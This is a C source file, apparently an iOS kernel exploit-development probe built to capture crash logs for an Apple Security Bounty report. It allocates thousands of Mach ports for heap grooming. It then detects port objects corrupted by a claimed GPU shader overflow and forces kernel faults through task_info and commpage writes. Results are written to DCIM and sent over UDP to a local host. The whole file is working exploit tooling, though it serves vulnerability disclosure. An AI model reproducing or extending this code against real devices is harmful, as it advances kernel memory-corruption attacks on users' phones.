/*
 * AllocatorProbe v6 — Commpage Target Flag Crash Trigger
 * =======================================================
 * Session continuation: F-74 → Apple Security Bounty IPS capture.
 *
 * Root cause of v3 missing the Commpage target (S159 post-mortem):
 *   v3 detection: kr != KERN_SUCCESS || kotype == 0 || kotype > 100
 *   With Commpage JS target, shader writes kotype=IKOT_TASK=2, kobject=COMMPAGE_TARGET.
 *   kotype=2: not 0, not >100 → condition FALSE → no crash → no IPS.
 *
 * Fix (this file):
 *   1. Detect kotype==IKOT_TASK (2) AND kobject==COMMPAGE_TARGET specifically.
 *   2. On detection: call task_info() on the corrupted port.
 *      Kernel dereferences ip_kobject=0x0000000FFFFFC330 as task_t*.
 *      ARM64 PAN blocks kernel access to user-space address → panic/EXC_BAD_ACCESS.
 *   3. Fallback: write to read-only commpage → user-space EXC_BAD_ACCESS, FAR=TARGET.
 *
 * Expected IPS:
 *   Exception: EXC_BAD_ACCESS
 *   FAR: 0x0000000FFFFFC330  (Apple Commpage Target Flag)
 *   Stack: report_and_die_commpage <- scan_ports <- timer_cb <- CFRunLoop <- main
 *   Proves: ip_kobject field controlled by AGX WebGL2 overflow (F-74 escalation)
 *
 * Bundle ID (before Sideloadly re-sign): com.nexus.fengshui3
 * After Sideloadly: com.nexus.fengshui3.TMAQ26273N.TMAQ26273N (replaces v3 on device)
 *
 * Build:
 *   SDK=$(xcrun -sdk iphoneos --show-sdk-path)
 *   xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 \
 *     -o AllocatorProbe_v6 heap_fengshui_v6.c \
 *     -isysroot "$SDK" -framework CoreFoundation
 */

#include <mach/mach.h>
#include <mach/task.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define NEXUS_UDP_HOST   "192.168.68.122"
#define NEXUS_UDP_PORT   9999

#define NUM_PORTS        5000
#define SCAN_INTERVAL    0.05   /* 50ms */
#define IKOT_TASK        2

/* Apple Security Bounty Commpage Target Flag */
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

static mach_port_t g_ports[NUM_PORTS];
static int         g_count = 0;
static int         g_found = 0;

static void udp_report(const char *buf, int len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
    close(sock);
}

static void dcim_write(const char *name, const char *buf, int len) {
    char path[128];
    snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd >= 0) { write(fd, buf, len); close(fd); }
    udp_report(buf, len);
    write(STDERR_FILENO, buf, len);
}

/* Commpage target: trigger PAN fault via task_info on corrupted port */
static void report_and_die_commpage(int port_idx, mach_vm_address_t kobject) {
    char buf[512];
    int n = snprintf(buf, sizeof(buf),
        "=== COMMPAGE_TARGET_DETECTED ===\n"
        "port_idx=%d kobject=0x%016llx (Apple Commpage Target Flag)\n"
        "kotype=IKOT_TASK(2): io_bits=0x80000002 written by AGX shader\n"
        "ip_kobject=0x0000000FFFFFC330: Commpage Target Flag written\n"
        "F-74 CONTROLLED WRITE PROVEN: Commpage Target Flag in ip_kobject\n"
        "Triggering task_info() -> kernel PAN fault at COMMPAGE_TARGET\n",
        port_idx, (unsigned long long)kobject);
    dcim_write("fengshui_v6_result", buf, n);

    /* Step 1: task_info forces kernel to dereference ip_kobject as task_t*
     * ARM64 PAN blocks access to user-space address 0x0000000FFFFFC330
     * → kernel panic (FAR=COMMPAGE_TARGET in panic log)
     * OR EXC_BAD_ACCESS propagated to user space (FAR=COMMPAGE_TARGET in IPS) */
    task_basic_info_data_t tinfo;
    mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
    task_info((task_t)g_ports[port_idx], TASK_BASIC_INFO, (task_info_t)&tinfo, &cnt);

    /* Step 2 fallback: if task_info returned without crash,
     * write to read-only commpage → user-space EXC_BAD_ACCESS, FAR=COMMPAGE_TARGET */
    volatile uint64_t *ptr = (volatile uint64_t *)kobject;
    *ptr = 0xBEEFDEAD00FACADE;

    /* terminal fallback */
    __builtin_trap();
}

/* Generic corruption: crash with 0xBEEFDEAD (legacy F-74 behavior) */
static void report_and_die_generic(int port_idx, kern_return_t kr, natural_t kotype,
                                   mach_vm_address_t kobject) {
    char buf[256];
    int n = snprintf(buf, sizeof(buf),
        "CORRUPTION_FOUND: port=%d kr=%d kotype=%u kobject=0x%016llx\n"
        "ipc_port in kalloc.192 CORRUPTED by AGX overflow\n",
        port_idx, kr, kotype, (unsigned long long)kobject);
    dcim_write("fengshui_v6_result", buf, n);

    __asm__ volatile(
        "mov x0, #0xDEAD\n"
        "movk x0, #0xBEEF, lsl #16\n"
        "blr x0\n"
    );
}

static void scan_ports(void) {
    if (g_found) return;
    for (int i = 0; i < g_count; i++) {
        natural_t         kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);

        int commpage_hit = (kr == KERN_SUCCESS &&
                            kotype == IKOT_TASK &&
                            kobject == COMMPAGE_TARGET);

        int generic_hit  = (kr != KERN_SUCCESS || kotype == 0 || kotype > 100);

        if (commpage_hit) {
            g_found = 1;
            report_and_die_commpage(i, kobject);
            return;
        }
        if (generic_hit) {
            g_found = 1;
            report_and_die_generic(i, kr, kotype, kobject);
            return;
        }
    }
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static int g_tick = 0;

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;
    if (g_tick == 1) {
        mach_port_t task = mach_task_self();
        for (int i = 0; i < NUM_PORTS; i++) {
            mach_port_t p = MACH_PORT_NULL;
            if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
            if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND)
                    != KERN_SUCCESS) {
                mach_port_deallocate(task, p); break;
            }
            g_ports[g_count++] = p;
        }
        char status[128];
        int sn = snprintf(status, sizeof(status),
            "READY ports=%d tick=1 scanning@50ms target=0x0000000FFFFFC330\n", g_count);
        dcim_write("fengshui_v6_status", status, sn);
    } else if (g_count > 0) {
        scan_ports();
        if (g_tick % 200 == 0) {
            char ping[64];
            int pn = snprintf(ping, sizeof(ping),
                "ALIVE tick=%d found=%d\n", g_tick, g_found);
            dcim_write("fengshui_v6_status", ping, pn);
        }
    }
}

int main(void) {
    unlink("/var/mobile/Media/DCIM/fengshui_v6_result");
    unlink("/var/mobile/Media/DCIM/fengshui_v6_status");

    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
